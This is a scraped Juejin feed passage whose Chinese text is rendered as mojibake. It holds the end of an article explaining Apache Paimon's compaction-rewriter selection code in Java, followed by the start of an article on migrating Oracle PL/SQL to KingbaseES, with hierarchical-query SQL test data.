    <span class="hljs-comment">// æ­¥2. åˆ›å»ºæ ¸å¿ƒåˆå¹¶æ’åºç®—æ³•ç±»MergeSorter(è¿™æ˜¯æ ¸å¿ƒ)ï¼Œä»¥åŠå…¶ä»–åˆå¹¶ç›¸å…³å‚æ•°</span>
    <span class="hljs-type">MergeSorter</span> <span class="hljs-variable">mergeSorter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MergeSorter</span>(options, keyType, valueType, ioManager);
    <span class="hljs-type">int</span> <span class="hljs-variable">maxLevel</span> <span class="hljs-operator">=</span> options.numLevels() - <span class="hljs-number">1</span>;
    <span class="hljs-type">MergeEngine</span> <span class="hljs-variable">mergeEngine</span> <span class="hljs-operator">=</span> options.mergeEngine();
    <span class="hljs-type">ChangelogProducer</span> <span class="hljs-variable">changelogProducer</span> <span class="hljs-operator">=</span> options.changelogProducer();
    <span class="hljs-type">LookupStrategy</span> <span class="hljs-variable">lookupStrategy</span> <span class="hljs-operator">=</span> options.lookupStrategy();
    <span class="hljs-comment">// CASE-1: changelog-producer = full-compactionï¼Œåˆ›å»ºå¹¶è¿”å›FullChangelogMergeTreeCompactRewriter</span>
    <span class="hljs-keyword">if</span> (changelogProducer.equals(FULL_COMPACTION)) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FullChangelogMergeTreeCompactRewriter</span>(
                maxLevel,
                mergeEngine,
                readerFactory,
                writerFactory,
                keyComparator,
                userDefinedSeqComparator,
                mfFactory,
                mergeSorter,
                logDedupEqualSupplier.get());
    }
    <span class="hljs-comment">// CASE-2: needLookupä¸ºtrueï¼Œè¿›ä¸€æ­¥åŒºåˆ†å†…éƒ¨å·¥å‚ï¼Œç„¶ååˆ›å»ºå¹¶è¿”å›LookupMergeTreeCompactRewriter</span>
    <span class="hljs-comment">/* è§„åˆ™å¦‚ä¸‹: ä¸‹é¢ä»»æ„ä¸€ä¸ªä¸ºtrueï¼Œåˆ™needLookup()è¿”å›true
        1. merge-engine = first-row
        2. changelog-producer = lookup
        3. deletion-vectors.enabled = true
        4. force-lookup = true
     */</span>
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lookupStrategy.needLookup) {
        LookupLevels.ValueProcessor&lt;?&gt; processor;
        LookupMergeTreeCompactRewriter.MergeFunctionWrapperFactory&lt;?&gt; wrapperFactory;
        FileReaderFactory&lt;KeyValue&gt; lookupReaderFactory = readerFactory;
        <span class="hljs-comment">// SUB-CASE-1: merge-engineä¸ºfirst-rowçš„ä¸éœ€è¦deletion-vectors.enabledä¸ºtrue</span>
        <span class="hljs-keyword">if</span> (lookupStrategy.isFirstRow) {
            <span class="hljs-keyword">if</span> (options.deletionVectorsEnabled()) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>(
                        <span class="hljs-string">"First row merge engine does not need deletion vectors because there is no deletion of old data in this merge engine."</span>);
            }
            <span class="hljs-comment">// åˆ›å»ºç®€åŒ–çš„è¯»å–å™¨ï¼ˆæ— éœ€è¯»å–å€¼ï¼Œä»…åˆ¤æ–­æ˜¯å¦å­˜åœ¨ï¼‰</span>
            lookupReaderFactory =
                    readerFactoryBuilder
                            .copyWithoutProjection()
                            .withReadValueType(RowType.of())
                            .build(partition, bucket, dvFactory);
            processor = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContainsValueProcessor</span>();
            wrapperFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FirstRowMergeFunctionWrapperFactory</span>(); <span class="hljs-comment">// é€‚é…first-rowåˆå¹¶é€»è¾‘</span>
        }
        <span class="hljs-comment">// SUB-CASE-2: å…¶ä»–éœ€è¦lookupçš„åœºæ™¯</span>
        <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// æ ¹æ®æ˜¯å¦æœ‰åˆ é™¤å‘é‡ï¼Œåˆ›å»ºå¤„ç†é”®å€¼å¯¹ä½ç½®/å†…å®¹çš„å¤„ç†å™¨</span>
            processor =
                    lookupStrategy.deletionVector
                            ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">PositionedKeyValueProcessor</span>(
                                    valueType,
                                    lookupStrategy.produceChangelog
                                            || mergeEngine != DEDUPLICATE
                                            || !options.sequenceField().isEmpty())
                            : <span class="hljs-keyword">new</span> <span class="hljs-title class_">KeyValueProcessor</span>(valueType);
            <span class="hljs-comment">// åˆ›å»ºåŒ…è£…å·¥å‚ï¼ˆé€‚é…å»é‡ã€åºåˆ—æ¯”è¾ƒç­‰åˆå¹¶é€»è¾‘ï¼‰</span>
            wrapperFactory =
                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LookupMergeFunctionWrapperFactory</span>&lt;&gt;(
                            logDedupEqualSupplier.get(),
                            lookupStrategy,
                            UserDefinedSeqComparator.create(valueType, options));
        }
        <span class="hljs-comment">// è¿”å›Lookupä¸“ç”¨é‡å†™å™¨</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LookupMergeTreeCompactRewriter</span>(
                maxLevel,
                mergeEngine,
                createLookupLevels(partition, bucket, levels, processor, lookupReaderFactory),
                readerFactory,
                writerFactory,
                keyComparator,
                userDefinedSeqComparator,
                mfFactory,
                mergeSorter,
                wrapperFactory,
                lookupStrategy.produceChangelog,
                dvMaintainer,
                options);
    }
    <span class="hljs-comment">// CASE-3: é»˜è®¤æƒ…å†µï¼Œé‡‡ç”¨MergeTreeCompactRewriter</span>
    <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MergeTreeCompactRewriter</span>(
                readerFactory,
                writerFactory,
                keyComparator,
                userDefinedSeqComparator,
                mfFactory,
                mergeSorter);
    }
}
</code></pre>
<h4 data-id="heading-8">(5) <code>createLookupLevels()</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºLookupå±‚çº§</span>
<span class="hljs-keyword">private</span> &lt;T&gt; LookupLevels&lt;T&gt; <span class="hljs-title function_">createLookupLevels</span><span class="hljs-params">(
        BinaryRow partition,
        <span class="hljs-type">int</span> bucket,
        Levels levels,
        LookupLevels.ValueProcessor&lt;T&gt; valueProcessor,
        FileReaderFactory&lt;KeyValue&gt; readerFactory)</span> {
    <span class="hljs-comment">// 1. æ£€æŸ¥ä¸´æ—¶ç£ç›˜ç›®å½•</span>
    <span class="hljs-keyword">if</span> (ioManager == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(
                <span class="hljs-string">"Can not use lookup, there is no temp disk directory to use."</span>);
    }
    <span class="hljs-comment">// 2. åˆ›å»º LookupStoreFactory</span>
    <span class="hljs-type">LookupStoreFactory</span> <span class="hljs-variable">lookupStoreFactory</span> <span class="hljs-operator">=</span>
            LookupStoreFactory.create(
                    options,
                    cacheManager,
                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">RowCompactedSerializer</span>(keyType).createSliceComparator());
    <span class="hljs-type">Options</span> <span class="hljs-variable">options</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.options.toConfiguration();
    <span class="hljs-comment">// 3. åˆ›å»ºLookupæ–‡ä»¶ç¼“å­˜</span>
    <span class="hljs-keyword">if</span> (lookupFileCache == <span class="hljs-literal">null</span>) {
        lookupFileCache =
                LookupFile.createCache(
                        options.get(CoreOptions.LOOKUP_CACHE_FILE_RETENTION), <span class="hljs-comment">// ç”±å‚æ•°'lookup.cache-file-retention'ç»‘å®šï¼Œé»˜è®¤1h</span>
                        options.get(CoreOptions.LOOKUP_CACHE_MAX_DISK_SIZE)); <span class="hljs-comment">// ç”±å‚æ•°'lookup.cache-max-disk-size'ç»‘å®šï¼Œé»˜è®¤Longæœ€å¤§å€¼</span>
    }
    <span class="hljs-comment">// 4.åˆ›å»ºå¹¶è¿”å›LookupLevels</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LookupLevels</span>&lt;&gt;(
            levels,
            keyComparatorSupplier.get(),
            keyType,
            valueProcessor,
            readerFactory::createRecordReader,
            file -&gt;
                    ioManager
                            .createChannel(
                                    localFilePrefix(partitionType, partition, bucket, file))
                            .getPathFile(),
            lookupStoreFactory,
            bfGenerator(options),
            lookupFileCache);
}
</code></pre>
<h2 data-id="heading-9">äºŒ.æ€»ç»“</h2>
<h3 data-id="heading-10">1.<code>KeyValueFileStoreWrite</code>æ€»ç»“</h3>
<p><code>KeyValueFileStoreWrite</code>æ˜¯ Paimon Primary Key è¡¨å†™å…¥å’Œå‹ç¼©æµç¨‹çš„<strong>ä¸­å¤®åè°ƒè€…</strong>ï¼Œæ‰¿æ‹…ä»¥ä¸‹æ ¸å¿ƒèŒè´£ï¼š</p>
<ol>
<li><strong>Writer ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ï¼šä¸ºæ¯ä¸ª partition-bucket åˆ›å»ºã€å¤ç”¨ã€é”€æ¯ <code>MergeTreeWriter</code></li>
<li><strong>å‹ç¼©ç®¡ç†å™¨å·¥å‚</strong>ï¼šæ ¹æ® <code>write-only</code> é…ç½®é€‰æ‹© <code>NoopCompactManager</code> æˆ– <code>MergeTreeCompactManager</code></li>
<li><strong>å‹ç¼©é‡å†™å™¨å·¥å‚</strong>ï¼šæ ¹æ® changelog-producerã€lookup ç­‰é…ç½®é€‰æ‹©æœ€ä¼˜çš„ <code>CompactRewriter</code></li>
<li><strong>å†…å­˜æ± åè°ƒ</strong>ï¼šç»§æ‰¿ <code>MemoryFileStoreWrite</code> çš„å…±äº«å†…å­˜æ± å’ŒæŠ¢å æœºåˆ¶</li>
</ol>
<h3 data-id="heading-11">2.ä¸‰ç§é‡å†™å™¨å¯¹æ¯”</h3>
<p>1.Â <strong>MergeTreeCompactRewriter</strong>Â (æ ‡å‡†é‡å†™å™¨)</p>
<ul>
<li><strong>é€‚ç”¨åœºæ™¯</strong>: æ ‡å‡†çš„ Primary Key è¡¨ï¼Œæ— ç‰¹æ®Šä¼˜åŒ–éœ€æ±‚</li>
<li><strong>æ ¸å¿ƒæµç¨‹</strong>:
è¯»å– SortedRuns â†’ å½’å¹¶æ’åº â†’ åº”ç”¨ MergeFunction â†’ å†™å…¥æ–°æ–‡ä»¶</li>
<li><strong>ç‰¹ç‚¹</strong>:
<ul>
<li>ç®€å•é«˜æ•ˆ</li>
<li>é€‚åˆå¤§éƒ¨åˆ†åœºæ™¯</li>
<li>åœ¨Â <code>rewriteCompaction()</code>Â ä¸­å®ç°æ ¸å¿ƒé€»è¾‘</li>
</ul>
</li>
</ul>
<p>2.Â <strong>FullChangelogMergeTreeCompactRewriter</strong>Â (å…¨é‡ Changelog é‡å†™å™¨)</p>
<ul>
<li><strong>é€‚ç”¨åœºæ™¯</strong>:Â <code>changelog-producer = full-compaction</code></li>
<li><strong>æ ¸å¿ƒç‰¹æ€§</strong>:
<ul>
<li>åªåœ¨æœ€é«˜å±‚çº§ (maxLevel) ç”Ÿæˆ changelog</li>
<li>ä½¿ç”¨Â <code>FullChangelogMergeFunctionWrapper</code>Â åŒ…è£…åˆå¹¶å‡½æ•°</li>
<li>åˆ¤æ–­é€»è¾‘åœ¨Â <code>rewriteChangelog()</code>Â ä¸­</li>
</ul>
</li>
<li><strong>å‡çº§ç­–ç•¥</strong>:
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> UpgradeStrategy <span class="hljs-title function_">upgradeStrategy</span><span class="hljs-params">(<span class="hljs-type">int</span> outputLevel, DataFileMeta file)</span> {
    <span class="hljs-keyword">return</span> outputLevel == maxLevel ? 
        CHANGELOG_NO_REWRITE :  <span class="hljs-comment">// æœ€é«˜å±‚: ç”Ÿæˆ changelog, ä¸é‡å†™</span>
        NO_CHANGELOG_NO_REWRITE; <span class="hljs-comment">// å…¶ä»–å±‚: ä¸ç”Ÿæˆ, ä¸é‡å†™</span>
}
</code></pre>
</li>
</ul>
<p>3.Â <strong>LookupMergeTreeCompactRewriter</strong>Â (Lookup ä¼˜åŒ–é‡å†™å™¨)</p>
<ul>
<li><strong>é€‚ç”¨åœºæ™¯</strong>:
<ul>
<li><code>lookup.cache-rows &gt; 0</code>Â æˆ–Â <code>lookup.cache-file-retention &gt; 0</code></li>
<li>éœ€è¦é€šè¿‡ Lookup åŠ é€ŸæŸ¥è¯¢</li>
</ul>
</li>
<li><strong>æ ¸å¿ƒæœºåˆ¶</strong>:
<ul>
<li>æ„å»ºÂ <code>LookupLevels</code>Â ç”¨äºå¿«é€ŸæŸ¥æ‰¾</li>
<li>æ”¯æŒä¸¤ç§å¤„ç†å™¨:
<ul>
<li><strong>FirstRowMergeFunctionWrapperFactory</strong>: åªä¿ç•™é¦–è¡Œ</li>
<li><strong>LookupMergeFunctionWrapperFactory</strong>: æ ‡å‡† Lookup åˆå¹¶</li>
</ul>
</li>
<li>ä½¿ç”¨Â <code>createLookupLevels()</code>Â åˆ›å»º Lookup å±‚çº§</li>
</ul>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é‡‘èè¡Œä¸šæ•°æ®åº“é€‰å‹ç›˜ç‚¹â€”â€”Kingbase PLSQLè¿ç§»æŒ‡å—]]></title>    <link>https://juejin.cn/post/7582890166357131290</link>    <guid>https://juejin.cn/post/7582890166357131290</guid>    <pubDate>2025-12-13T08:12:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582890166357131290" data-draft-id="7582815307440357427" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é‡‘èè¡Œä¸šæ•°æ®åº“é€‰å‹ç›˜ç‚¹â€”â€”Kingbase PLSQLè¿ç§»æŒ‡å—"/> <meta itemprop="keywords" content="æ•°æ®åº“"/> <meta itemprop="datePublished" content="2025-12-13T08:12:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å€”å¼ºçš„çŸ³å¤´_"/> <meta itemprop="url" content="https://juejin.cn/user/3168119757484368"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é‡‘èè¡Œä¸šæ•°æ®åº“é€‰å‹ç›˜ç‚¹â€”â€”Kingbase PLSQLè¿ç§»æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3168119757484368/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å€”å¼ºçš„çŸ³å¤´_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T08:12:07.000Z" title="Sat Dec 13 2025 08:12:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æèµ·é‡‘èï¼Œç”µä¿¡ï¼Œèƒ½æºè¿™äº›å…³é”®è¡Œä¸šï¼ŒOracleä¾é å¼ºå¤§çš„PL/SQLç”Ÿæ€å’Œç¨³å®šæ€§ï¼Œç§°å…¶ä¸ºâ€œè€å¤§å“¥â€å®è‡³åå½’ï¼Œé•¿æ—¶é—´å æ®æ ¸å¿ƒåœ°ä½ï¼Œä½†æ˜¯ï¼Œâ€œä¿¡åˆ›â€æµªæ½®è¢­æ¥ï¼Œè€Œä¸”å¤§å®¶éƒ½æƒ³é™æœ¬å¢æ•ˆï¼Œæ‰€ä»¥ï¼Œâ€œå»Oâ€è¿™ä»¶äº‹å¯ä»¥è¯´æ˜¯åæ‹¿ä¹ç¨³ã€‚</p>
<p>ç„¶è€Œåˆ°äº†çœŸæ­£çš„é€‰å‹é˜¶æ®µï¼Œè®¸å¤š CIO å’Œ æ¶æ„å¸ˆå¯Ÿè§‰åˆ°ä¸€ä¸ªå¤§å‘ï¼š<strong>æ¬è¿æ•°æ®å¹¶ééš¾äº‹ï¼Œä½†ä¸šåŠ¡é€»è¾‘çš„è¿ç§»å´ä»¤äººå¤´ç–¼ä¸å·²</strong>ï¼Œé‚£äº›æ²‰å¯‚äº†æ•°åå¹´ï¼Œä»£ç é‡é«˜è¾¾æ•°ä¸‡è¡Œçš„å­˜å‚¨è¿‡ç¨‹ï¼ŒåŒ…ï¼ˆPackageï¼‰ï¼Œè§¦å‘å™¨ï¼Œè‹¥è¦é äººåŠ›é‡æ–°ç¼–å†™ï¼Œè´¢åŠ›å°†ä¼šå¿«é€Ÿè€—å°½ï¼Œè€Œä¸”é£é™©ä¹Ÿæ— æ³•æŒæ§ã€‚</p>
<p>è¿™ä¸€æœŸçš„ç›˜ç‚¹æ´»åŠ¨ï¼Œè®©æˆ‘ä»¬æ·±å…¥æ¢ç©¶å›½äº§æ•°æ®åº“ä¸­çš„â€œå­¦é™¢æ´¾â€å…¸å‹â€”â€”é‡‘ä»“æ•°æ®åº“KingbaseESï¼Œæ¢å¯»å…¶ä¸ºä½•ç§°è‡ªå·±å…·å¤‡â€œç¡¬æ ¸â€çš„Oracleå…¼å®¹èƒ½åŠ›ï¼Œåˆæ˜¯æ€æ ·è¢«é€‰ä¸ºé‡‘èçº§æ ¸å¿ƒç³»ç»Ÿæ›¿æ¢ä¹‹é€‰çš„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0f874bca97344c08e16ce48599a104d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766218326&amp;x-signature=DXAO6x8CFh71ros41kI8oloLkQc%3D" alt="6afab92a91c68b0136e0917b049a9a1a.jpg" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ ä¸ºä»€ä¹ˆè¯´â€œå…¼å®¹æ€§â€æ˜¯é€‰å‹çš„ç”Ÿæ­»çº¿ï¼Ÿ</h2>
<p>åœ¨é‡‘èåœˆå­é‡Œï¼Œæ ¸å¿ƒä¸šåŠ¡é€»è¾‘é‚£æ˜¯é«˜åº¦ä¾èµ– Oracle çš„â€œç‹¬é—¨ç»æŠ€â€çš„ã€‚é€‰å‹çš„æ—¶å€™ä½ è¦æ˜¯åªç›¯ç€â€œæ”¯æŒ SQL æ ‡å‡†â€çœ‹ï¼Œåé¢ç»å¯¹å‘å¾—ä½ æ€€ç–‘äººç”Ÿã€‚è¦æƒ³çœŸæ­£åšåˆ°â€œæ— ç¼è¿ç§»â€ï¼Œå¿…é¡»å¾—é—¯è¿‡è¿™ä¸‰é“å…³ï¼š</p>
<ol>
<li><strong>è¯­æ³•çº§å…¼å®¹</strong>ï¼šå…‰æ”¯æŒä¸ªæ ‡å‡† <code>SELECT</code> å“ªå¤Ÿå•Šï¼Ÿåƒ <code>CONNECT BY</code>ã€<code>DECODE</code>ã€<code>PIVOT</code> è¿™äº› Oracle çš„â€œæ–¹è¨€â€ï¼Œå¿…é¡»å¾—èƒ½ç›´æ¥è·‘ã€‚</li>
<li><strong>å¯¹è±¡çº§å…¼å®¹</strong>ï¼šå­˜å‚¨è¿‡ç¨‹ã€å‡½æ•°ã€åŒ…ã€åºåˆ—ã€åŒä¹‰è¯ã€è§†å›¾è¿™äº›ä¸œè¥¿ï¼Œèƒ½ä¸èƒ½ç›´æ¥å¯¼è¿›å»ï¼Ÿ</li>
<li><strong>è¡Œä¸ºçº§å…¼å®¹</strong>ï¼šç©ºä¸²åˆ°åº•æ˜¯ä¸æ˜¯ NULLï¼Ÿäº‹åŠ¡éš”ç¦»çº§åˆ«æ˜¯ä¸æ˜¯ä¸€ä¸ªæ ·ï¼Ÿå¼‚å¸¸å¤„ç†æœºåˆ¶èƒ½ä¸èƒ½å¯¹å¾—ä¸Šï¼Ÿ</li>
</ol>
<p><strong>KingbaseESï¼ˆKESï¼‰</strong> æ¯•ç«Ÿæ˜¯æºè‡ªä¸­å›½äººæ°‘å¤§å­¦ï¼Œä½œä¸ºâ€œæ•°æ®åº“å›½å®¶é˜Ÿâ€ï¼Œå®ƒæ‰‹é‡Œæœ€å¤§çš„åº•ç‰Œä¹‹ä¸€ï¼Œå°±æ˜¯<strong>å†…æ ¸çº§çš„ Oracle å…¼å®¹å¼•æ“</strong>ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/911c95000d1a4a30a55998e29d750024~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766218326&amp;x-signature=MJOnfzjeIxZXI6jx8NgV99b8bfY%3D" alt="dd7f5fc10c7baf96d588767148905e4.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-1">äºŒã€ KingbaseES æ ¸å¿ƒæŠ€æœ¯ç›˜ç‚¹ï¼šç¡¬æ ¸ä»£ç å®æµ‹</h2>
<p>ä¸ºäº†éªŒè¯ KingbaseES æ˜¯ä¸æ˜¯çœŸçš„åƒå®ƒè¯´çš„é‚£ä¹ˆèƒ½æ‰“ï¼Œæˆ‘ä»¬ä¸“é—¨æŒ‘äº†å‡ ä¸ªé‡‘èåœºæ™¯é‡Œæœ€è®©äººå¤´ç–¼çš„è¿ç§»ç—›ç‚¹ï¼Œæ¥äº†ä¸€åœºå®æµ‹ã€‚</p>
<h3 data-id="heading-2">1. å±‚æ¬¡æŸ¥è¯¢ï¼ˆHierarchical Queryï¼‰</h3>
<p><strong>ç—›ç‚¹</strong>ï¼šé“¶è¡Œçš„æœºæ„æ ‘ã€è´¦æˆ·å±‚çº§ï¼Œé‚£éƒ½æ˜¯ Oracle <code>CONNECT BY</code> è¯­æ³•çš„é‡ç¾åŒºã€‚å¾ˆå¤šå›½äº§æ•°æ®åº“éƒ½è¦æ±‚æ”¹å†™æˆ <code>WITH RECURSIVE</code>ï¼ˆé€’å½’ CTEï¼‰ï¼Œè¿™è¦æ˜¯æ”¹èµ·æ¥ï¼Œä»£ç é‡å¤§å¾—å“äººã€‚</p>
<p><strong>KingbaseES è¡¨ç°</strong>ï¼š<strong>åŸç”Ÿå°±æ”¯æŒï¼Œä»£ç ä¸€ä¸ªå­—éƒ½ä¸ç”¨æ”¹ã€‚</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 1. å‡†å¤‡æµ‹è¯•æ•°æ®</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> branch_offices (
    org_id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY,
    org_name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>),
    parent_org_id <span class="hljs-type">INT</span>
);

<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> branch_offices <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'æ€»è¡Œ'</span>, <span class="hljs-keyword">NULL</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> branch_offices <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">101</span>, <span class="hljs-string">'åŒ—äº¬åˆ†è¡Œ'</span>, <span class="hljs-number">1</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> branch_offices <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">102</span>, <span class="hljs-string">'ä¸Šæµ·åˆ†è¡Œ'</span>, <span class="hljs-number">1</span>);
